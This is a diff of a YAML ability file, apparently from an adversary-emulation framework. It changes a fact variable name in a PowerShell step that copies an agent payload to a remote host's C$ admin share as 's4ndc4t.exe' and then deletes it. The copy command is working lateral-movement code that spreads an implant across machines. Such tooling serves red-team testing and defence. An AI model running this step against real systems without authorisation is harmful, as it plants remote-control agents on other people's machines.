@@ -10,27 +10,27 @@
       psh:
         command: |
           $path = "sandcat.go-windows";
-          $drive = "\\#{remote.host.fqdn}\C$";
+          $drive = "\\#{host.fqdn}\C$";
           Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
         cleanup: |
-          $drive = "\\#{remote.host.fqdn}\C$";
+          $drive = "\\#{host.fqdn}\C$";
           Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
         parsers:
           plugins.stockpile.app.parsers.54ndc47_remote_copy:
-          - source: remote.host.fqdn
+          - source: host.fqdn
             edge: has_54ndc47_copy
         payloads:
         - sandcat.go-windows
   singleton: True
   requirements:
   - plugins.stockpile.app.requirements.not_exists:
-    - source: remote.host.fqdn
+    - source: host.fqdn
       edge: has_54ndc47_copy
   - plugins.stockpile.app.requirements.basic:
-    - source: remote.host.fqdn
+    - source: host.fqdn
       edge: has_share
   - plugins.stockpile.app.requirements.no_backwards_movement:
-    - source: remote.host.fqdn
+    - source: host.fqdn
   - plugins.stockpile.app.requirements.reachable:
-      - source: remote.host.fqdn
+      - source: host.fqdn
         edge: isAccessibleFrom
